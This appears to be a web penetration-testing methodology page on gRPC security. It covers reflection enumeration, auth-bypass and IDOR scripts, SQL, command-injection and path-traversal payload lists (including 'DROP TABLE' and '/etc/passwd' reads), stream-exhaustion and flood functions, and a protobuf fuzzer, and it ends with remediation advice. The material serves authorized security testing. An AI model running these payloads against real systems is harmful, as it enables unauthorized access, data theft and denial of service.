---
title: "gRPC Security Testing"
date: 2026-02-24
draft: false
---

# gRPC Security Testing

> **Severity**: High | **CWE**: CWE-284, CWE-20
> **OWASP**: A01:2021 – Broken Access Control | A03:2021 – Injection

---

## What Is gRPC?

gRPC is Google's Remote Procedure Call framework using HTTP/2 as transport and Protocol Buffers (protobuf) as the serialization format. Unlike REST, gRPC uses a binary wire format and requires a `.proto` schema definition. The attack surface differs significantly from REST APIs:

- Binary encoding obscures payloads from passive inspection
- gRPC reflection (server-side schema discovery) often left enabled in production
- Authentication is per-connection or per-call via metadata headers
- Four communication patterns: unary, server-streaming, client-streaming, bidirectional streaming
- gRPC-Web is a browser-compatible variant proxied through HTTP/1.1 or HTTP/2

```
gRPC attack surface:
  gRPC Reflection → full service/method enumeration (like introspection in GraphQL)
  Metadata headers → auth bypass (incorrect header parsing, case sensitivity)
  Protobuf fuzzing → buffer overflow, type confusion in custom parsers
  Authorization on service vs method level → method-level bypass
  gRPC-Web proxy → HTTP/1.1 wrapper enables Burp interception without plugin
```

---

## Discovery Checklist

**Phase 1 — Service Discovery**
- [ ] Check if gRPC reflection is enabled: `grpcurl list TARGET:443`
- [ ] Identify gRPC ports: 443, 9090, 50051, 8080 (gRPC-Web usually on 443 or 8080)
- [ ] Check for `.proto` files in public source repos, mobile app binaries, JS bundles
- [ ] Identify gRPC-Web endpoints by Content-Type: `application/grpc-web+proto` or `application/grpc+proto`
- [ ] Check if gRPC endpoint is behind same domain as REST API (path-based routing)

**Phase 2 — Authentication Analysis**
- [ ] Identify auth mechanism: JWT in `Authorization` metadata, API key in custom header
- [ ] Test without any auth metadata — anonymous access?
- [ ] Test with expired/invalid token
- [ ] Test with user token on admin-only methods
- [ ] Check metadata header case sensitivity (gRPC spec requires lowercase)

**Phase 3 — Injection & Fuzzing**
- [ ] Test each string field for injection: SQLi, CMDi, SSTI, path traversal
- [ ] Test integer fields for overflow: send max int64, negative values
- [ ] Test empty/null/zero-length fields
- [ ] Fuzz repeated fields with large arrays
- [ ] Test nested message fields for unexpected behavior

---

## Payload Library

### Payload 1 — gRPC Reflection Enumeration

```bash
# Install grpcurl:
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
# Or: brew install grpcurl / apt install grpcurl

# Check if reflection is enabled (list all services):
grpcurl -plaintext TARGET:50051 list
grpcurl -insecure TARGET:443 list   # with TLS but skip verification

# With authentication:
grpcurl -H "Authorization: Bearer YOUR_TOKEN" \
  -insecure TARGET:443 list

# List methods for a specific service:
grpcurl -plaintext TARGET:50051 list com.example.UserService

# Describe a service (full schema):
grpcurl -plaintext TARGET:50051 describe com.example.UserService

# Describe specific method (request/response types):
grpcurl -plaintext TARGET:50051 describe com.example.UserService.GetUser

# Describe a message type:
grpcurl -plaintext TARGET:50051 describe com.example.GetUserRequest

# Full schema dump for all services:
grpcurl -plaintext TARGET:50051 list | while read svc; do
  echo "=== $svc ==="
  grpcurl -plaintext TARGET:50051 describe "$svc"
  grpcurl -plaintext TARGET:50051 list "$svc" | while read method; do
    echo "  Method: $method"
    grpcurl -plaintext TARGET:50051 describe "$method"
  done
done

# Without reflection — if .proto files are known:
grpcurl -plaintext \
  -proto user.proto \
  -import-path ./protos \
  TARGET:50051 com.example.UserService.GetUser

# gRPC-Web discovery (browser-compatible):
# Check for grpc-web proxy headers:
curl -si "https://target.com/" -H "Content-Type: application/grpc-web+proto" | \
  grep -i "grpc\|content-type"

# Test gRPC-Web endpoint:
curl -s "https://target.com/com.example.UserService/GetUser" \
  -H "Content-Type: application/grpc-web+proto" \
  -H "Authorization: Bearer TOKEN" \
  --data-binary @request.bin | hexdump -C
```

### Payload 2 — Method Invocation and Auth Bypass

```bash
# Call a method with valid auth:
grpcurl -plaintext \
  -H "Authorization: Bearer VALID_TOKEN" \
  -d '{"user_id": "123"}' \
  TARGET:50051 com.example.UserService/GetUser

# Test without authorization header:
grpcurl -plaintext \
  -d '{"user_id": "123"}' \
  TARGET:50051 com.example.UserService/GetUser

# Test with empty authorization:
grpcurl -plaintext \
  -H "Authorization: " \
  -d '{"user_id": "123"}' \
  TARGET:50051 com.example.UserService/GetUser

# Test with invalid token:
grpcurl -plaintext \
  -H "Authorization: Bearer INVALID_TOKEN_XYZ" \
  -d '{"user_id": "123"}' \
  TARGET:50051 com.example.UserService/GetUser

# IDOR via method call — access other users' data:
for user_id in $(seq 1 100); do
  result=$(grpcurl -plaintext \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -d "{\"user_id\": \"$user_id\"}" \
    TARGET:50051 com.example.UserService/GetUser 2>&1)
  if echo "$result" | grep -q "email\|name"; then
    echo "[!!!] IDOR: user_id=$user_id accessible → $result"
  fi
done

# Test admin methods with user token:
admin_methods=(
  "com.example.AdminService/ListAllUsers"
  "com.example.AdminService/DeleteUser"
  "com.example.AdminService/GetSystemConfig"
  "com.example.UserService/AdminGetUser"
)

for method in "${admin_methods[@]}"; do
  result=$(grpcurl -plaintext \
    -H "Authorization: Bearer USER_TOKEN" \
    -d '{}' TARGET:50051 "$method" 2>&1)
  echo "$method → $result"
done

# Metadata header case sensitivity bypass:
# gRPC requires lowercase metadata, but some implementations accept mixed case:
grpcurl -plaintext \
  -H "AUTHORIZATION: Bearer TOKEN" \
  -d '{"user_id": "1"}' \
  TARGET:50051 com.example.UserService/GetUser

grpcurl -plaintext \
  -H "authorization: Bearer TOKEN" \
  -H "Authorization: Bearer DIFFERENT_TOKEN" \
  -d '{"user_id": "1"}' \
  TARGET:50051 com.example.UserService/GetUser
```

### Payload 3 — Injection Testing via gRPC Fields

```python
#!/usr/bin/env python3
"""
gRPC field injection testing using grpcurl subprocess
"""
import subprocess, json, shlex

TARGET = "TARGET:50051"
SERVICE_METHOD = "com.example.SearchService/Search"
TOKEN = "YOUR_AUTH_TOKEN"

def grpc_call(payload_dict):
    cmd = [
        "grpcurl", "-plaintext",
        "-H", f"Authorization: Bearer {TOKEN}",
        "-d", json.dumps(payload_dict),
        TARGET, SERVICE_METHOD
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    return result.stdout + result.stderr

# SQL Injection payloads for string fields:
sqli_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "' UNION SELECT null,username,password FROM users--",
    "1; SELECT * FROM users WHERE id=1",
    "' OR 1=1#",
    "admin'--",
    "' OR ''='",
]

print("[*] Testing SQL injection in 'query' field:")
for payload in sqli_payloads:
    result = grpc_call({"query": payload, "limit": 10})
    if any(err in result.lower() for err in ["sql", "syntax", "error", "exception"]):
        print(f"[!!!] Possible SQLi: {payload[:40]} → {result[:200]}")
    else:
        print(f"[ ] {payload[:30]} → {result[:100]}")

# Command injection:
cmdi_payloads = [
    "test; id",
    "test | id",
    "test`id`",
    "test$(id)",
    "test\nid",
    "; cat /etc/passwd",
]

print("\n[*] Testing command injection:")
for payload in cmdi_payloads:
    result = grpc_call({"filename": payload})
    if "root:" in result or "uid=" in result:
        print(f"[!!!] COMMAND INJECTION: {payload} → {result[:200]}")

# Path traversal in file-related fields:
traversal_payloads = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
    "/etc/passwd",
]

print("\n[*] Testing path traversal:")
for payload in traversal_payloads:
    result = grpc_call({"file_path": payload})
    if "root:" in result:
        print(f"[!!!] PATH TRAVERSAL: {payload}")

# Integer overflow:
int_payloads = [
    {"amount": 2147483648},    # int32 overflow
    {"amount": -1},            # negative
    {"amount": 0},             # zero
    {"amount": 9999999999999},  # large
]

print("\n[*] Testing integer fields:")
for payload in int_payloads:
    result = grpc_call(payload)
    print(f"  amount={payload['amount']}: {result[:100]}")
```

### Payload 4 — gRPC Streaming Attack Patterns

```python
#!/usr/bin/env python3
"""
gRPC streaming-specific attacks
Requires: pip install grpcio grpcio-tools
"""
import grpc, threading, time

# If you have the .proto compiled:
# python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. service.proto

# Example: Unary with timeout/retry abuse:
def unary_flood(channel, stub, n=1000):
    """Flood single method with concurrent requests"""
    import concurrent.futures
    def call():
        try:
            stub.GetUser(UserRequest(user_id=1),
                        metadata=[('authorization', 'Bearer TOKEN')])
        except: pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        futures = [ex.submit(call) for _ in range(n)]
        concurrent.futures.wait(futures)

# Server-streaming: exhaust resources by opening many streams:
def stream_exhaustion(stub):
    """Open many server-streaming calls without consuming"""
    streams = []
    for i in range(100):
        try:
            stream = stub.StreamData(
                DataRequest(id=i),
                metadata=[('authorization', 'Bearer TOKEN')])
            streams.append(stream)  # Don't consume — exhaust server resources
        except Exception as e:
            print(f"Stream {i}: {e}")
            break
    print(f"Opened {len(streams)} streams")

# Bidirectional stream with adversarial messages:
def bidi_injection(stub):
    """Send adversarial messages in bidirectional stream"""
    injections = [
        {'message': "' OR '1'='1"},     # SQLi in chat message
        {'message': "<script>alert(1)"},  # XSS if reflected
        {'message': "A" * 100000},       # Oversized message
        {'message': "\x00" * 100},       # Null bytes
        {'message': "\n\r\n\rHTTP/1.1 200 OK\n\n"},  # Protocol injection
    ]

    def msg_gen():
        for injection in injections:
            yield ChatMessage(**injection)
            time.sleep(0.1)

    try:
        responses = stub.Chat(msg_gen(),
                             metadata=[('authorization', 'Bearer TOKEN')])
        for resp in responses:
            print(f"Response: {resp}")
    except Exception as e:
        print(f"Error: {e}")
```

### Payload 5 — Protobuf Binary Fuzzing

```python
#!/usr/bin/env python3
"""
Fuzz gRPC endpoints by mutating protobuf binary payloads
"""
import struct, random, subprocess, json

TARGET = "TARGET:50051"
METHOD = "com.example.DataService/ProcessData"

def encode_varint(value):
    """Encode a varint"""
    buf = b''
    while True:
        towrite = value & 0x7f
        value >>= 7
        if value:
            buf += bytes([towrite | 0x80])
        else:
            buf += bytes([towrite])
            break
    return buf

def make_protobuf_field(field_num, wire_type, value):
    """Create a protobuf field"""
    tag = (field_num << 3) | wire_type
    return encode_varint(tag) + value

def make_string_field(field_num, value):
    """Wire type 2: length-delimited (string/bytes/embedded message)"""
    encoded = value.encode() if isinstance(value, str) else value
    return make_protobuf_field(field_num, 2, encode_varint(len(encoded)) + encoded)

def make_varint_field(field_num, value):
    """Wire type 0: varint"""
    return make_protobuf_field(field_num, 0, encode_varint(value))

# Mutation strategies for protobuf:
def fuzz_protobuf(base_message_hex, iterations=100):
    base = bytes.fromhex(base_message_hex)
    results = []

    for i in range(iterations):
        mutated = bytearray(base)

        # Random mutation strategies:
        strategy = random.choice(['flip', 'insert', 'delete', 'replace', 'overflow'])

        if strategy == 'flip' and mutated:
            pos = random.randint(0, len(mutated) - 1)
            mutated[pos] ^= random.randint(1, 255)
        elif strategy == 'insert':
            pos = random.randint(0, len(mutated))
            mutated[pos:pos] = bytes([random.randint(0, 255)] * random.randint(1, 16))
        elif strategy == 'delete' and len(mutated) > 2:
            pos = random.randint(0, len(mutated) - 1)
            del mutated[pos]
        elif strategy == 'replace':
            if mutated:
                mutated = bytes([random.randint(0, 255)] * len(mutated))
        elif strategy == 'overflow':
            mutated = base + bytes([0xff] * 10000)  # Very large message

        # Send via grpcurl (binary mode):
        with open('/tmp/fuzz_payload.bin', 'wb') as f:
            f.write(bytes(mutated))

        cmd = f"grpcurl -plaintext -H 'Authorization: Bearer TOKEN' " \
              f"-d '@/tmp/fuzz_payload.bin' {TARGET} {METHOD}"
        result = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, timeout=5)

        if result.returncode != 0 and "INTERNAL" in result.stderr:
            print(f"[!!!] Crash/error with {strategy}: {result.stderr[:200]}")
            results.append((strategy, bytes(mutated).hex(), result.stderr))

    return results

# Example base message (field 1: string "test", field 2: int 1):
# {"query": "test", "limit": 1} in protobuf:
base = make_string_field(1, "test") + make_varint_field(2, 1)
fuzz_results = fuzz_protobuf(base.hex(), iterations=200)
print(f"[*] Found {len(fuzz_results)} interesting responses")
```

---

## Tools

```bash
# grpcurl — primary gRPC testing CLI:
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Postman — supports gRPC (GUI-based):
# https://www.postman.com/downloads/

# Evans — interactive gRPC client:
go install github.com/ktr0731/evans@latest
evans --host TARGET --port 50051 --reflection repl

# gRPCox — web UI for gRPC testing:
docker run -p 6969:6969 soluble/grpcox

# Burp Suite gRPC support:
# Extension: "gRPC-Web" (BApp Store) — handles gRPC-Web content type
# Or: use gRPC-Web proxy (grpc-web proxy) → HTTP/1.1 → Burp → gRPC backend

# grpc-web proxy (Envoy) for Burp interception:
# If gRPC-Web: set Burp as upstream proxy
# If native gRPC: use Burp + gRPC extension or mitmproxy with gRPC addon

# mitmproxy with gRPC addon:
pip3 install mitmproxy
# Custom addon: decode protobuf messages
mitmdump -s grpc_decoder.py --mode regular

# protoc — compile .proto files:
apt install protobuf-compiler
protoc --python_out=. service.proto
python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. service.proto

# ghz — gRPC load testing / DoS testing (authorized tests only):
ghz --insecure --proto service.proto \
  --call com.example.UserService.GetUser \
  -d '{"user_id": "1"}' \
  -n 10000 -c 100 \
  TARGET:50051

# Awesome-gRPC security resources:
# github.com/grpc/grpc/blob/master/doc/security_audit.md

# nuclei templates for gRPC:
nuclei -target TARGET:50051 -t network/grpc/
```

---

## Remediation Reference

- **Disable gRPC reflection in production**: `grpc.reflection.v1alpha.ServerReflection` should not be enabled on production servers — it exposes the full API schema like introspection in GraphQL
- **Per-method authorization**: implement authorization checks at the method level, not just the service level — gRPC interceptors (middleware) are the standard pattern; verify token on every RPC call
- **Validate all fields**: treat all protobuf fields as untrusted input — validate length, range, format; reject oversized messages at the server level via `MaxRecvMsgSize`
- **Authenticate metadata**: use `grpc.UnaryInterceptor` and `grpc.StreamInterceptor` to enforce authentication on all unary and streaming methods
- **TLS mutual authentication**: for internal gRPC services, use mTLS to prevent unauthorized clients from connecting
- **Rate limiting on streaming**: bidirectional streaming methods can be abused to exhaust resources — implement per-stream rate limiting and message count limits
- **Schema validation**: use well-typed protobuf definitions; avoid `bytes` or `string` for structured data; validate at the application level after deserialization

*Part of the Web Application Penetration Testing Methodology series.*
